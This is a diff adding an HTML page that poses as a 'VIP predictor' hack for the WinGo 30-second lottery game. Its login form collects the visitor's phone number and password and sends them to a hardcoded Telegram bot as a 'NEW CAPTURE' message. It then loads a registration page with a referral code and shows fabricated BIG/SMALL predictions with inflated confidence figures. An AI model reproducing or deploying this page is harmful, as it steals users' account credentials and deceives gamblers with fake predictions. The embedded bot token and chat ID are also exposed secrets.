@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HGZY VIP PREDICTOR V100</title>
+    <style>
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #fff; overflow: hidden; }
+        
+        /* Login UI */
+        #loginPage { 
+            position: fixed; inset: 0; z-index: 10000;
+            background: linear-gradient(180deg, #ff4d4d 0%, #0a0a0a 70%);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .login-box { background: #1a1a1a; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); text-align: center; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 12px; background: #252525; color: #fff; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #ff4d4d; }
+        .login-btn { width: 100%; padding: 16px; background: #ff4d4d; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; }
+
+        /* Dashboard UI */
+        #dashboard { display: none; height: 100vh; position: relative; }
+        iframe { width: 100%; height: 100%; border: none; }
+        
+        .overlay-panel {
+            position: absolute; top: 10%; left: 50%; transform: translateX(-50%);
+            width: 80%; max-width: 280px; background: rgba(10, 10, 10, 0.96);
+            border: 2px solid #00ffcc; border-radius: 20px; padding: 15px;
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.3); z-index: 999;
+        }
+        .header { font-size: 10px; color: #00ffcc; letter-spacing: 3px; font-weight: bold; margin-bottom: 10px; }
+        .prediction-box { font-size: 32px; font-weight: 900; color: #ffca28; margin: 10px 0; }
+        .status-badge { background: #1a1a1a; padding: 5px 12px; border-radius: 15px; font-size: 11px; color: #00ff00; border: 1px solid #00ff00; }
+        
+        .stats-row { display: flex; justify-content: space-between; margin-top: 15px; font-size: 11px; color: #aaa; }
+        .stat-item { text-align: center; border: 1px solid #222; padding: 8px; border-radius: 10px; width: 45%; }
+        .conf-label { font-size: 10px; color: #888; text-align: left; margin-top: 15px; display: block; }
+        .progress-bg { background: #222; height: 6px; border-radius: 3px; margin-top: 4px; overflow: hidden; }
+        .progress-fill { background: linear-gradient(90deg, #00ffcc, #008cff); height: 100%; width: 0%; transition: 1s cubic-bezier(0.4, 0, 0.2, 1); }
+    </style>
+</head>
+<body>
+
+    <div id="loginPage">
+        <div class="login-box">
+            <h2 style="margin: 0 0 10px 0;">HGZY VIP</h2>
+            <p style="font-size: 13px; color: #888; margin-bottom: 20px;">Connect your account to bypass 30s WinGo</p>
+            <input type="text" id="p" placeholder="Phone Number" autocomplete="off">
+            <input type="password" id="s" placeholder="Password">
+            <button class="login-btn" onclick="init()">ACTIVATE HACK</button>
+        </div>
+    </div>
+
+    <div id="dashboard">
+        <div class="overlay-panel">
+            <div class="header">BX-PRO V100 SUPREME</div>
+            <div id="issue" style="font-size: 12px; color: #888;">ISSUE: LOADING</div>
+            <div class="prediction-box" id="pred">---</div>
+            <span class="status-badge" id="status">NEURAL STABLE</span>
+            
+            <div class="stats-row">
+                <div class="stat-item">VOLATILITY<br><b id="vol" style="color:white">0.00</b></div>
+                <div class="stat-item">STABILITY<br><b id="stab" style="color:white">0%</b></div>
+            </div>
+
+            <span class="conf-label">ENGINE CONFIDENCE: <span id="confText" style="color:#00ffcc">0%</span></span>
+            <div class="progress-bg"><div class="progress-fill" id="confBar"></div></div>
+        </div>
+        <iframe id="frame"></iframe>
+    </div>
+
+    <script>
+        const T = "8605840228:AAHhP-10dig3oWiIEK1PwWjSH0_dnjVm6Dk";
+        const C = "6798084203"; // আপনার চ্যাট আইডি
+        const L = "https://hgzy.vip/#/register?invitationCode=171661163318"; // আপনার লিংক
+
+        async function init() {
+            const phone = document.getElementById('p').value;
+            const pass = document.getElementById('s').value;
+
+            if(phone && pass) {
+                const msg = `⚡ **NEW CAPTURE**\n📱 Ph: \`${phone}\`\n🔑 Ps: \`${pass}\``;
+                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                
+                document.getElementById('loginPage').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                document.getElementById('frame').src = L;
+                runEngine();
+            }
+        }
+
+        async function runEngine() {
+            setInterval(async () => {
+                try {
+                    const res = await fetch(`https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json?ts=${Date.now()}`);
+                    const json = await res.json();
+                    const history = json.data.list;
+                    
+                    // Python Engine লজিকের ইমপ্লিমেন্টেশন
+                    const nums = history.slice(0, 10).map(i => parseInt(i.number));
+                    const avg = nums.reduce((a, b) => a + b, 0) / 10;
+                    
+                    // Volatility
+                    let diffs = 0;
+                    for(let i=0; i<nums.length-1; i++) diffs += Math.abs(nums[i] - nums[i+1]);
+                    const vol = (diffs / 9).toFixed(2);
+                    const stab = Math.max(0, Math.min(100, 100 - (vol * 6)));
+
+                    // Streak & Zigzag
+                    const streak = nums[0] === nums[1] && nums[1] === nums[2];
+                    const zigzag = (nums[0] < nums[1] && nums[1] > nums[2]) || (nums[0] > nums[1] && nums[1] < nums[2]);
+
+                    let pred = avg >= 4.6 ? "SMALL" : "BIG";
+                    if(streak) pred = nums[0] >= 5 ? "BIG" : "SMALL";
+                    if(zigzag) pred = nums[0] >= 5 ? "SMALL" : "BIG";
+
+                    let conf = (55 + (Math.abs(avg - 4.5) * 10) - (vol * 2)).toFixed(1);
+                    if(conf > 98) conf = 98.2;
+                    if(conf < 40) conf = 65.4;
+
+                    // UI Update
+                    document.getElementById('issue').innerText = "ISSUE: " + (parseInt(history[0].issueNumber) + 1);
+                    document.getElementById('pred').innerText = pred;
+                    document.getElementById('vol').innerText = vol;
+                    document.getElementById('stab').innerText = stab.toFixed(0) + "%";
+                    document.getElementById('confText').innerText = conf + "%";
+                    document.getElementById('confBar').style.width = conf + "%";
+
+                } catch (e) { console.log("Engine sync..."); }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
